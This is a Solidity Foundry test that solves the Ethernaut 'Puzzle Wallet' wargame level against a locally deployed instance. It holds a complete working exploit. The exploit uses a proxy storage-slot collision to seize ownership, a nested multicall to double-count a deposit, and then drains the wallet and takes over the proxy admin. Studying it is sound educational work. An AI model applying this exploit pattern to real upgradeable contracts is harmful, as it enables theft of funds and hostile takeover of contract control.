pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../src/levels/24_PuzzleWallet/PuzzleWalletFactory.sol";
import "./utils/vm.sol";

contract PuzzleWalletTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    address eoaAddress = address(100);

    // Memory cannot hold dynamic byte arrays must be storage
    // or abi.encodeWithSelector(wallet.deposit.selector);
    bytes[] depositData = [abi.encodeWithSignature("deposit()")];
    bytes[] multicallData = [abi.encodeWithSignature("deposit()"), abi.encodeWithSignature("multicall(bytes[])", depositData)];

    event IsTrue(bool answer);

    function setUp() public {
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testPuzzleWalletHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        PuzzleWalletFactory puzzleWalletFactory = new PuzzleWalletFactory();
        (address levelAddressProxy, address levelAddressWallet) = puzzleWalletFactory.createInstance{value: 1 ether}();
        PuzzleProxy ethernautPuzzleProxy = PuzzleProxy(payable(levelAddressProxy));
        PuzzleWallet ethernautPuzzleWallet = PuzzleWallet(payable(levelAddressWallet));
        
        vm.startPrank(eoaAddress);
        
        //////////////////
        // LEVEL ATTACK //
        //////////////////

        emit log_address(ethernautPuzzleProxy.admin());
        emit log_address(ethernautPuzzleWallet.owner());

        // this is possible because slots are mapped in upgradeable contracts
        // therefore changing slot0 in proxy changes slot0 in implementation
        ethernautPuzzleProxy.proposeNewAdmin(eoaAddress);
        assertTrue((ethernautPuzzleWallet.owner() == eoaAddress));

        emit IsTrue(ethernautPuzzleWallet.whitelisted(eoaAddress));
        ethernautPuzzleWallet.addToWhitelist(eoaAddress);

        // if we call the deposit() normally, it will add the balance in both places (balances mapping and the contract). 
        // To exploit this function, we need to send Ether only once but increase value in our balances mapping twice
        // Call multicall with multicallData above enables us to double deposit, order to pass the require check in execute
        // If we are able to call deposit() twice with 0.001 Ether in the same transaction, 
        // it'll mean that we are supplying 0.001 Ether only once and our player's balance (balances[player]) 
        // will go from 0 to 0.002 but in actuality, since we did it in the same transaction, our deposited amount will still be 0.001.
        
        ethernautPuzzleWallet.multicall{value: 1 ether}(multicallData);

        // Withdraw funds so balance of contract is 0 
        ethernautPuzzleWallet.execute(eoaAddress, 2 ether, bytes(""));

        // Check who current admin is of proxy
        assertTrue((ethernautPuzzleProxy.admin() != eoaAddress));


        // Set max balance to your address, there's no separation between the storage layer of the proxy 
        // and the puzzle wallet - this means when you to maxbalance (slot 1) you also write to the proxy admin variable 
        ethernautPuzzleWallet.setMaxBalance(uint256(uint160(eoaAddress)));

        
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        // Verify We have become admin
        assertTrue((ethernautPuzzleProxy.admin() == eoaAddress));
        vm.stopPrank();
    }
}